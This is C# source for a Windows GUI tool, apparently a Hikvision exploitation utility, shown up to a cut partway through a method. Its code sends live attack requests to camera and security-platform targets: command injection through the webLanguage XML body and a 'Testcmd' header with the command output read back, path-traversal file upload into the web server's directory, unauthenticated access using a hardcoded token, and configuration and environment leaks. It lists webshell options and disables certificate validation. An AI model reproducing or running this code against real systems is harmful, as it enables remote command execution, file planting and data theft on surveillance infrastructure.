using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics.Eventing.Reader;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace hikvision漏洞利用工具
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private static bool RemoteCertificateValidate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {

            return true;
        }

        private void Form1_Load(object sender, EventArgs e)


        {



            comboBox1.Items.Add("ALL");
            comboBox1.Items.Add("Hikvision 摄像头未授权访问漏洞");
            comboBox1.Items.Add("Hikvision 远程代码执行漏洞");
            comboBox1.Items.Add("Hikvision iVMS综合安防系统任意文件上传漏洞");
            comboBox1.Items.Add("Hikvision综合安防管理平台isecure center文件上传漏洞");
            comboBox1.Items.Add("Hikvision综合安防管理平台config信息泄露漏洞");
            comboBox1.Items.Add("Hikvision综合安防管理平台env信息泄漏漏洞");
            comboBox1.Items.Add("Hikvision综合安防管理平台report任意文件上传漏洞");
            comboBox1.Items.Add("Hikvision综合安防管理平台api session命令执行漏洞");
            comboBox2.Items.Add("Godzilla");
            comboBox2.Items.Add("Behinder");
            comboBox2.Items.Add("AntSword");
            comboBox2.Items.Add("cmd");
            comboBox3.Items.Add("Hikvision 远程代码执行漏洞");
            comboBox3.Items.Add("Hikvision iVMS综合安防系统任意文件上传漏洞");
            comboBox3.Items.Add("Hikvision综合安防管理平台isecure center文件上传漏洞");
            comboBox3.Items.Add("Hikvision综合安防管理平台config信息泄露漏洞");
            comboBox3.Items.Add("Hikvision综合安防管理平台api session命令执行漏洞");
            comboBox3.Items.Add("Hikvision综合安防管理平台env信息泄漏漏洞");
            comboBox4.Items.Add("Hikvision 远程代码执行漏洞");
            comboBox4.Items.Add("Hikvision综合安防管理平台api session命令执行漏洞");
            comboBox5.Items.Add("Hikvision iVMS综合安防系统任意文件上传漏洞");
            comboBox5.Items.Add("Hikvision综合安防管理平台isecure center文件上传漏洞");
            comboBox5.Items.Add("Hikvision综合安防管理平台report任意文件上传漏洞");

        }

        private void button2_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "";
            richTextBox2.Text = "";
            richTextBox6.Text = "";
        }

        public void ss()
        {


            try
            {



                //    {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                //    string text = textBox1.Text;
                //   bool isValid = Regex.IsMatch(text, @"^(http://|https://)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$");
                // //   if (isValid)
                //    {
                // richTextBox1.Text = "\n" + "[-]" + timeString;
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string url = textBox1.Text + "/Security/users?auth=YWRtaW46MTEK ";


                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                HttpStatusCode statusCode = response.StatusCode;
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                if (s.Contains("<userName>"))
                {
                    {

                        richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision 摄像头未授权访问漏洞");

                        richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "/System/configurationFile?auth=YWRtaW46MTEK");

                    }

                }
                else
                {

                    richTextBox1.AppendText("\n+" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 摄像头未授权访问漏洞");
                }










                //  richTextBox1.Text = "拼写错误";




                //    else
                //    {

                //      richTextBox1.AppendText("请加入http或https");







            }
            catch (Exception ex)


            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                //MessageBox.Show(ex.Message);
                richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 摄像头未授权访问漏洞");

            }


        }

        public void cmd()
        {




            try
            {


                if (textBox1.Text == "")
                {

                    richTextBox6.Text = "未输入任何地址！";

                }
                else
                {




                    DateTime now = DateTime.Now;
                    string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                    String urlss = textBox1.Text + "/center/api/session";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                    request.Method = "POST";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "application/json, text/plain, */*";
                    request.ContentType = "application/json;charset=UTF-8";

                    //    request.Headers.Add("Sec-Fetch-Dest", "document");
                    //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                    //    request.Headers.Add("Sec-Fetch-Site", "none");
                    //    request.Headers.Add("Sec-Fetch-User", "?1");
                    request.Headers.Add("Testcmd", textBox8.Text);

                    String postid = textBox7.Text;
                    StreamWriter ss = new StreamWriter(request.GetRequestStream());  //请求我们的postid =参数数据
                                                                                     //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                                                                                     //   request.ContentLength = postData.Length;
                                                                                     //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                    //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                    //        byte[] byte1 = encoding.GetBytes(xmlData);
                    //      request.ContentLength = byte1.Length;

                    ss.Write(postid);
                    ss.Close();

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                    Stream getStream = response.GetResponseStream();
                    StreamReader streamreader = new StreamReader(getStream);
                    String ssss = streamreader.ReadToEnd();

                    if (response.StatusCode == HttpStatusCode.OK)
                    {

                        richTextBox6.Text = ssss;
                    }

                    // richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台api session命令执行漏洞");
                    else
                    {

                        richTextBox6.AppendText("\n" + "命令执行失败");
                    }




                    //    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");
                }


            }
            catch (Exception ex)
            {

                richTextBox6.AppendText("\n" + "命令执行失败");
                {
                    //  richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");

                }

            }

        }





        public void api2()
        {





            try
            {




                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                String urlss = textBox1.Text + "/center/api/session";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "application/json, text/plain, */*";
                request.ContentType = "application/json;charset=UTF-8";

                //    request.Headers.Add("Sec-Fetch-Dest", "document");
                //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                //    request.Headers.Add("Sec-Fetch-Site", "none");
                //    request.Headers.Add("Sec-Fetch-User", "?1");
                request.Headers.Add("Testcmd", "echo test");

                String postid = textBox7.Text;
                StreamWriter ss = new StreamWriter(request.GetRequestStream());  //请求我们的postid =参数数据
                                                                                 //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                                                                                 //   request.ContentLength = postData.Length;
                                                                                 //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                //        byte[] byte1 = encoding.GetBytes(xmlData);
                //      request.ContentLength = byte1.Length;

                ss.Write(postid);
                ss.Close();

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream);
                String ssss = streamreader.ReadToEnd();
                if (ssss.Contains("json转换失败"))
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台api session命令执行漏洞");
                    // richTextBox1.Text = ssss;
                }

                else
                {

                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");
                }
            }
            catch (Exception ex)
            {

                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox6.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");

                }

            }


        }

        public void api()
        {


            try
            {




                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                String urlss = textBox1.Text + "/center/api/session";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "application/json, text/plain, */*";
                request.ContentType = "application/json;charset=UTF-8";

                //    request.Headers.Add("Sec-Fetch-Dest", "document");
                //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                //    request.Headers.Add("Sec-Fetch-Site", "none");
                //    request.Headers.Add("Sec-Fetch-User", "?1");
                request.Headers.Add("Testcmd", "echo test");

                String postid = textBox7.Text;
                StreamWriter ss = new StreamWriter(request.GetRequestStream());  //请求我们的postid =参数数据
                                                                                 //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                                                                                 //   request.ContentLength = postData.Length;
                                                                                 //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                //        byte[] byte1 = encoding.GetBytes(xmlData);
                //      request.ContentLength = byte1.Length;

                ss.Write(postid);
                ss.Close();

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream);
                String ssss = streamreader.ReadToEnd();
                if (ssss.Contains("json转换失败"))
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台api session命令执行漏洞");
                    // richTextBox1.Text = ssss;
                }

                else
                {

                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");
                }
            }
            catch (Exception ex)
            {

                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");

                }

            }

        }

        public void report1()
        {


            try
            {





                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string filePath = "r1da5678b39482efb.txt";
                string uploadUrl = textBox1.Text + "/svm/api/external/report";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=-----------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/r1da5678b39482efb.txt\"\r\n" +
                                  "Content-Type: application/zip\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();

                if (ssss.Contains("msg"))
  {
      richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台report任意文件上传漏洞");



  }
                else
                {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台report任意文件上传漏洞");

                }


            }
            catch (Exception ex)
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台report任意文件上传漏洞");


                }
            }

        }

        public void report()
        {




            try
            {





                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string filePath = "r1da5678b39482efb.txt";
                string uploadUrl = textBox1.Text + "/svm/api/external/report";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=-----------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/r1da5678b39482efb.txt\"\r\n" +
                                  "Content-Type: application/zip\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();

                  if (ssss.Contains("msg"))
    {
        richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台report任意文件上传漏洞");



    }
                else
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台report任意文件上传漏洞");

                }


            }
            catch (Exception ex)
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台report任意文件上传漏洞");


                }

            }

        }

        public void env()
        {


            try
            {



                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/artemis-portal/artemis/env";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                String s = reader.ReadToEnd();
                if (s.Contains("java.class.path"))
                {

                    richTextBox1.AppendText("\n" + now + "目标" + "[+]存在Hikvision综合安防管理平台env信息泄露漏洞");
                    //     richTextBox1.Text = s;
                    richTextBox1.AppendText(textBox1.Text + "/artemis-portal/artemis/env");
                }
                else
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台env信息泄露漏洞");

                }







            }
            catch (Exception ex)
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台env信息泄露漏洞");


                }

            }

        }

        public void config()
        {


            try
            {



                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/portal/conf/config.properties";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                String s = reader.ReadToEnd();
                if (s.Contains("bic.serviceDirectory.ip"))
                {
                    //      {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision综合安防管理平台config信息泄露漏洞");
                    //  richTextBox1.Text = s;
                    richTextBox1.AppendText(textBox1.Text + "/portal/conf/config.properties");
                }
                else
                {

                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台config信息泄露漏洞");
                }
            }


            catch (Exception ex)
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision综合安防管理平台config信息泄露漏洞");


                }

            }
        }

        public void isecure2()
        {

            try
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/center/api/files;.js";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                String s = reader.ReadToEnd();
                if (s.Contains("404"))
                    //      {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision isecure center文件上传漏洞");

                //   richTextBox1.Text = s;
                //    }
                //
                else if (s.Contains("url is error"))
                {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]可能存在Hikvision isecure center文件上传漏洞");

                }
                {
                    {







                    }




                }

            }

            catch
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision isecure center文件上传漏洞");



                }
            }

        }


        public void isecure()
        {

            try
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/center/api/files;.js";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                String s = reader.ReadToEnd();
                if (s.Contains("404"))
                    //      {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision isecure center文件上传漏洞");

                //   richTextBox1.Text = s;
                //    }
                //
                else if (s.Contains("url is error"))
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]可能存在Hikvision isecure center文件上传漏洞");

                }
                {
                    {







                    }




                }

            }

            catch
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision isecure center文件上传漏洞");



                }
            }

        }

        public void ivms1()
        {
            try
            {


                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/eps/api/resourceOperations/upload";

                //    MessageBox.Show("默认请求路径/mz");
                //     MessageBox.Show("默认执行env命令");
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AllowAutoRedirect = false;
                request.Method = "POST"; //get请求方法
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                request.ContentType = "application/x-www-form-urlencoded";
                //       request.Credentials = null;
                //    request.Headers.Add("Sec-Fetch-Dest", "document");
                //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                //    request.Headers.Add("Sec-Fetch-Site", "none");
                //    request.Headers.Add("Sec-Fetch-User", "?1");
                //   request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                string xmlData = "service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action";
                //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                //   request.ContentLength = postData.Length;
                //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                byte[] byte1 = encoding.GetBytes(xmlData);
                request.ContentLength = byte1.Length;
                StreamWriter ss = new StreamWriter(request.GetRequestStream());
                ss.Write(xmlData);
                ss.Flush();
                // button6.Enabled = true;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);
                HttpStatusCode statusCode = response.StatusCode;

                String s = streamreader.ReadToEnd();
                if (s.Contains("errorMessage"))
                {

                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision iVMS综合安防系统任意文件上传漏洞");
                }
                else
                {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision iVMS综合安防系统任意文件上传漏洞");

                }
            }
            catch (Exception ex)
            {

                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox3.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision iVMS综合安防系统任意文件上传漏洞");
                }
            }

        }
        public void ivms()
        {



            try
            {


                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/eps/api/resourceOperations/upload";

                //    MessageBox.Show("默认请求路径/mz");
                //     MessageBox.Show("默认执行env命令");
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AllowAutoRedirect = false;
                request.Method = "POST"; //get请求方法
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                request.ContentType = "application/x-www-form-urlencoded";
                //       request.Credentials = null;
                //    request.Headers.Add("Sec-Fetch-Dest", "document");
                //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                //    request.Headers.Add("Sec-Fetch-Site", "none");
                //    request.Headers.Add("Sec-Fetch-User", "?1");
                //   request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                string xmlData = "service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action";
                //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                //   request.ContentLength = postData.Length;
                //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                byte[] byte1 = encoding.GetBytes(xmlData);
                request.ContentLength = byte1.Length;
                StreamWriter ss = new StreamWriter(request.GetRequestStream());
                ss.Write(xmlData);
                ss.Flush();
                // button6.Enabled = true;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);
                HttpStatusCode statusCode = response.StatusCode;

                String s = streamreader.ReadToEnd();
                if (s.Contains("errorMessage"))
                {

                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision iVMS综合安防系统任意文件上传漏洞");
                }
                else
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision iVMS综合安防系统任意文件上传漏洞");

                }
            }
            catch (Exception ex)
            {

                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                {
                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision iVMS综合安防系统任意文件上传漏洞");
                }
            }

        }
        public void yanzheng()
        {

            try
            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/mz";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                String s = reader.ReadToEnd();
                if (response.StatusCode == HttpStatusCode.OK)
                    //      {

                    //   richTextBox1.AppendText("\n"+now+"[+]存在海康威视CVE-2021-36260命令执行漏洞");
                    richTextBox6.Text = s;
                //    }
                //  else
                {

                    //  richTextBox1.AppendText("\n"+now +"[-]不存在海康威视CVE-2021-36260命令执行漏洞");
                }


            }

            catch (Exception ex)
            {
                richTextBox6.AppendText("\n" + "命令执行失败");

            }
            {


            }
        }

        public void mingling2()
        {
            try
            {


                if (textBox1.Text == "")
                {

                    richTextBox6.Text = "未输入任何地址!";
                }
                else
                {





                    DateTime now = DateTime.Now;
                    string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                    ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                    String url = textBox1.Text + "/SDK/webLanguage";

                    //    MessageBox.Show("默认请求路径/mz");
                    //     MessageBox.Show("默认执行env命令");
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                    request.Method = "PUT"; //get请求方法
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    request.ContentType = "application/xml";
                    request.Credentials = null;
                    //    request.Headers.Add("Sec-Fetch-Dest", "document");
                    //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                    //    request.Headers.Add("Sec-Fetch-Site", "none");
                    //    request.Headers.Add("Sec-Fetch-User", "?1");
                    request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                    string xmlData = "<?xml version='1.0' encoding='UTF-8'?><language>$(" + textBox8.Text + " > webLib/mz)</language>";
                    //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                    //   request.ContentLength = postData.Length;
                    //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                    ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                    byte[] byte1 = encoding.GetBytes(xmlData);
                    request.ContentLength = byte1.Length;
                    StreamWriter ss = new StreamWriter(request.GetRequestStream());
                    ss.Write(xmlData);
                    ss.Flush();
                    button6.Enabled = true;
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                    Stream getStream = response.GetResponseStream();
                    StreamReader streamreader = new StreamReader(getStream);
                    String sss = streamreader.ReadToEnd();
                    if (response.StatusCode == HttpStatusCode.InternalServerError)
                    {

                        richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision 远程代码执行漏洞");
                        yanzheng();
                    }
                    else
                    {

                        richTextBox1.AppendText(now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");

                    }




                }
            }

            catch (Exception ex)
            {


